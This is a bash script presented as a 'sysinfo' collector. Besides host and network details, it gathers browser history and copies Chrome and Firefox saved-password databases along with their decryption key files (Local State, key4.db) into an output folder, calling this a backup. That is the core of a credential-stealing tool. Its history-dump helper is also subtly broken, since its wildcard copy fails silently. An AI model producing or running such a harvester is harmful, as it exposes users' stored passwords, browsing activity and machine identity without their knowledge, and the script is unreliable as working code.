#!/usr/bin/env bash
set -euo pipefail

# --- Setup ---
SCRIPT_DIR="$(dirname "$(realpath "$0")")"
OUT_DIR="$SCRIPT_DIR/sysinfo_output"
mkdir -p "$OUT_DIR"

# --- Helper: safe sqlite query ---
dump_sqlite() {
    local src_db="$1"
    local query="$2"
    local out_file="$3"

    if [ -f "$src_db" ]; then
        tmp_db="$(mktemp)"
        # copy db and any WAL/SHM sidecar files if present
        cp "$src_db"* "$tmp_db" 2>/dev/null || true
        sqlite3 "$tmp_db" "$query" > "$out_file" 2>/dev/null || true
        rm -f "$tmp_db"
    fi
}

# --- System Info ---
OS="$(. /etc/os-release && echo "$NAME")"
OS_VERSION="$(. /etc/os-release && echo "$VERSION")"
KERNEL="$(uname -r)"
HOSTNAME="$(hostname)"
USERNAME="$(whoami)"

IP=$(ip -o -4 addr show scope global | awk '{print $4}' | cut -d/ -f1 | paste -sd "," -)
MAC=$(ip -o link show | awk '/ether/ {print $2}' | paste -sd "," -)

CPU=$(grep -m1 "model name" /proc/cpuinfo | cut -d: -f2- | xargs)
MEM_TOTAL=$(grep MemTotal /proc/meminfo | awk '{print $2 " kB"}')
MEM_FREE=$(grep MemAvailable /proc/meminfo | awk '{print $2 " kB"}')

{
    echo "Operating System: $OS $OS_VERSION"
    echo "Kernel: $KERNEL"
    echo "Computer Name: $HOSTNAME"
    echo "Username: $USERNAME"
    echo "IP Address(es): $IP"
    echo "MAC Address(es): $MAC"
    echo "Processor: $CPU"
    echo "Memory (Free/Total): $MEM_FREE / $MEM_TOTAL"
} > "$OUT_DIR/system_info.txt"

# --- Home directory listing ---
find "$HOME" -maxdepth 1 -ls > "$OUT_DIR/home_listing.txt"

# --- Browser Data Collection ---
BROWSER_OUT="$OUT_DIR/browser"
mkdir -p "$BROWSER_OUT"

# Function: Collect Chrome/Chromium Data
collect_chrome_data() {
    local profile_dir="$1"
    local profile_name
    profile_name=$(basename "$profile_dir")

    echo "Collecting Chrome/Chromium from: $profile_dir"

    # History
    dump_sqlite "$profile_dir/History" \
        "SELECT url, title, visit_count,
                datetime(last_visit_time/1000000-11644473600,'unixepoch')
         FROM urls ORDER BY last_visit_time DESC LIMIT 50;" \
        "$BROWSER_OUT/chrome_history_${profile_name}.csv"

    # Saved Logins backup
    if [ -f "$profile_dir/Login Data" ] && [ -f "$HOME/.config/google-chrome/Local State" ]; then
        cp "$profile_dir/Login Data" "$BROWSER_OUT/Login_Data_${profile_name}"
        cp "$HOME/.config/google-chrome/Local State" "$BROWSER_OUT/Local_State_${profile_name}"
    fi

    # Bookmarks
    if [ -f "$profile_dir/Bookmarks" ]; then
        cp "$profile_dir/Bookmarks" "$BROWSER_OUT/bookmarks_${profile_name}.json"
    fi
}

# Function: Collect Firefox Data
collect_firefox_data() {
    local profile_dir="$1"
    local profile_name
    profile_name=$(basename "$profile_dir")

    echo "Collecting Firefox from: $profile_dir"

    # History
    dump_sqlite "$profile_dir/places.sqlite" \
        "SELECT moz_places.url, moz_places.title,
                datetime(moz_historyvisits.visit_date/1000000,'unixepoch')
         FROM moz_historyvisits
         JOIN moz_places ON moz_places.id = moz_historyvisits.place_id
         ORDER BY moz_historyvisits.visit_date DESC LIMIT 50;" \
        "$BROWSER_OUT/firefox_history_${profile_name}.csv"

    # Saved Logins backup
    if [ -f "$profile_dir/logins.json" ] && [ -f "$profile_dir/key4.db" ]; then
        cp "$profile_dir/logins.json" "$BROWSER_OUT/logins_${profile_name}.json"
        cp "$profile_dir/key4.db" "$BROWSER_OUT/key4_${profile_name}.db"
    fi
}

# --- Scan for Chrome & Chromium profiles ---
for base in "$HOME/.config/google-chrome" "$HOME/.config/chromium"; do
    if [ -d "$base" ]; then
        for profile in "$base"/*/; do
            [ -d "$profile" ] && collect_chrome_data "$profile"
        done
    fi
done

# --- Scan for Firefox profiles ---
if [ -d "$HOME/.mozilla/firefox" ]; then
    for profile in "$HOME/.mozilla/firefox"/*.default*; do
        [ -d "$profile" ] && collect_firefox_data "$profile"
    done
fi

echo "✅ Data collection complete. See: $OUT_DIR"

